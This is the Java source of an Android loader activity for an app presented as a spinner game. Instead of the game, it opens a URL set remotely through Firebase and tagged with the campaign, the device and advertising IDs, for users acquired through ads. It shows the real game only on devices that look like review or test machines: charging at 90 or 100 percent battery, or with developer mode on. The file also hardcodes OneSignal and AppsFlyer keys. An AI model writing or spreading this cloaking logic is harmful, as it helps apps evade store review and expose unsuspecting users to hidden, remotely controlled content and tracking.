package com.spiner.spinthis;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Bundle;
import android.widget.ImageView;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.bumptech.glide.Glide;
import com.facebook.FacebookSdk;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;

import org.json.JSONObject;

import java.io.IOException;
import java.util.Map;

public class LoaderActivity extends AppCompatActivity implements SaveInterface{

    ImageView gif;

    private static final String ONE_SIGNAL = "88cb378c-d185-4bf9-b687-cb3520bbdaaf";
    SharedPreferences sharedPreferences;
    private String adId = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loader);
        gif = (ImageView)findViewById(R.id.imageView);

        Glide.with(this).load(R.drawable.monkey).into(gif);

        sharedPreferences = getSharedPreferences("PREF", MODE_PRIVATE);

        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONE_SIGNAL);
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        if (!firstRun(sharedPreferences)) {
            if (!getPoint(sharedPreferences).isEmpty()) {
                startPlay();
            } else {
                startGame();
            }
        } else {
            if (((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo() == null) {
                startGame();
            } else {
                AppsFlyerLib.getInstance().init("iTV7pzHvKAfACb5RavNRSG", new AppsFlyerConversionListener() {
                    @Override
                    public void onConversionDataSuccess(Map<String, Object> conversionData) {
                        if (firstFl(sharedPreferences)) {
                            getAddId();
                            FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                            FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                                    .setMinimumFetchIntervalInSeconds(3600)
                                    .build();
                            firebaseRemoteConfig.setConfigSettingsAsync(configSettings);
                            firebaseRemoteConfig.fetchAndActivate()
                                    .addOnCompleteListener(LoaderActivity.this, new OnCompleteListener<Boolean>() {
                                        @Override
                                        public void onComplete(@NonNull Task<Boolean> task) {
                                            try {
                                                String ref = firebaseRemoteConfig.getValue("box_1").asString();
                                                JSONObject jsonObject = new JSONObject(conversionData);
                                                if (jsonObject.optString("af_status").equals("Non-organic")) {
                                                    String campaign = jsonObject.optString("campaign");
                                                    if (campaign.isEmpty() || campaign.equals("null")) { campaign = jsonObject.optString("c"); }
                                                    String[] splitsCampaign = campaign.split("_");
                                                    try{OneSignal.sendTag("user_id", splitsCampaign[2]);}catch (Exception e){}
                                                    String workUrl = ref + "?nmg=" + campaign + "&dv_id=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&avr=" + adId;
                                                    setPoint(workUrl, sharedPreferences);
                                                    AppsFlyerLib.getInstance().unregisterConversionListener();
                                                    startPlay();
                                                } else if (jsonObject.optString("af_status").equals("Organic")) {
                                                    BatteryManager bm = (BatteryManager)getSystemService(BATTERY_SERVICE);
                                                    int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                                                    boolean isCharging = isPhonePluggedIn(LoaderActivity.this);
                                                    if (((batLevel == 100 || batLevel == 90) && isCharging) || isDevMode()) {
                                                        setPoint("", sharedPreferences);
                                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                                        startGame();
                                                    } else {
                                                        String workUrl = ref + "?nmg=null&dv_id=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&avr=" + adId;
                                                        setPoint(workUrl, sharedPreferences);
                                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                                        startPlay();
                                                    }
                                                } else {
                                                    setPoint("", sharedPreferences);
                                                    AppsFlyerLib.getInstance().unregisterConversionListener();
                                                    startGame();
                                                }
                                                setFirstRun(false, sharedPreferences);
                                                setFirstFl(false, sharedPreferences);
                                                AppsFlyerLib.getInstance().unregisterConversionListener();
                                            } catch (Exception ex) {
                                            }
                                        }
                                    });
                        }
                    }

                    @Override
                    public void onConversionDataFail(String errorMessage) {
                    }

                    @Override
                    public void onAppOpenAttribution(Map<String, String> attributionData) {
                    }

                    @Override
                    public void onAttributionFailure(String errorMessage) {
                    }
                }, this);
                AppsFlyerLib.getInstance().start(this);
                AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(true);
            }
        }
    }

    private void startGame(){
        startActivity(new Intent(LoaderActivity.this, MainActivity.class));
        finish();
    }
    private void startPlay(){
        startActivity(new Intent(LoaderActivity.this, DesignActivity.class));
        finish();
    }
    public void getAddId(){
        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    AdvertisingIdClient.Info adInfo = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext());
                    adId = adInfo != null ? adInfo.getId() : null;
                } catch (IOException | GooglePlayServicesRepairableException | GooglePlayServicesNotAvailableException exception) {
                }
            }
        });

    }

    @Override
    public boolean firstRun(SharedPreferences sp) {
        return sp.getBoolean("p1", true);
    }

    @Override
    public void setFirstRun(boolean firstRun, SharedPreferences sp) {
        sp.edit().putBoolean("p1", firstRun).apply();
    }

    @Override
    public boolean firstFl(SharedPreferences sp) {
        return sp.getBoolean("p2", true);
    }

    @Override
    public void setFirstFl(boolean firstFl, SharedPreferences sp) {
        sp.edit().putBoolean("p2", firstFl).apply();
    }

    @Override
    public boolean firstParam(SharedPreferences sp) {
        return sp.getBoolean("p3", true);
    }

    @Override
    public void setFirstParam(boolean firstParam, SharedPreferences sp) {
        sp.edit().putBoolean("p3", firstParam).apply();
    }

    @Override
    public String getPoint(SharedPreferences sp) {
        return sp.getString("p4", "");
    }

    @Override
    public void setPoint(String point, SharedPreferences sp) {
        sp.edit().putString("p4", point).apply();
    }

    @Override
    public boolean isPhonePluggedIn(Context context) {
        boolean charging = false;
        final Intent batteryIntent = context.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean batteryCharge = status==BatteryManager.BATTERY_STATUS_CHARGING;
        int chargePlug = batteryIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        if (batteryCharge) charging=true;
        if (usbCharge) charging=true;
        if (acCharge) charging=true;
        return charging;
    }

    private boolean isDevMode() {
        return android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0) != 0;
    }
}